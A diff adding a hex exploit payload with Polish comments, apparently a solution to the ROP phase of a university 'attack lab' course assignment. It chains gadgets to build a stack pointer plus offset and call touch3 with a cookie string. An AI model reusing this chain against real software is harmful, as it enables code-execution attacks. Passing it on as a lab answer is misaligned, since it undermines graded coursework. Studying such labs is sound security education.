@@ -1,0 +1,17 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* dotąd jest padding */
+90 1d 40 00 00 00 00 00 /* 48 89 e0 == movq %rsp, %rax => getval_217 + 2 */
+57 1d 40 00 00 00 00 00 /* 48 89 c7 == movq %rax, %rdi => setval_122 + 2 */
+4d 1d 40 00 00 00 00 00 /* 58       == popq %rax       => addval_364 + 5 */
+48 00 00 00 00 00 00 00 /* offset stringu ciasteczka od poczatku wywolan (bez paddingu) */
+e6 1d 40 00 00 00 00 00 /* 89 c2    == movl %eax, %edx => getval_284 + 1 */
+48 1e 40 00 00 00 00 00 /* 89 d1    == movl %edx, %ecx => getval_355 + 1 */
+1b 1e 40 00 00 00 00 00 /* 89 c3    == movl %ecx, %esi => getval_445 + 1 */
+7c 1d 40 00 00 00 00 00 /* instrukcja add_xy, otrzymujemy %rax = %rdi + %rsi */
+57 1d 40 00 00 00 00 00 /* 48 89 c7 == movq %rax, %rdi => setval_122 + 2 */
+ae 1c 40 00 00 00 00 00 /* wywolanie touch3 */
+32 63 32 65 64 64 62 38 /* string ciasteczka w hex */
+
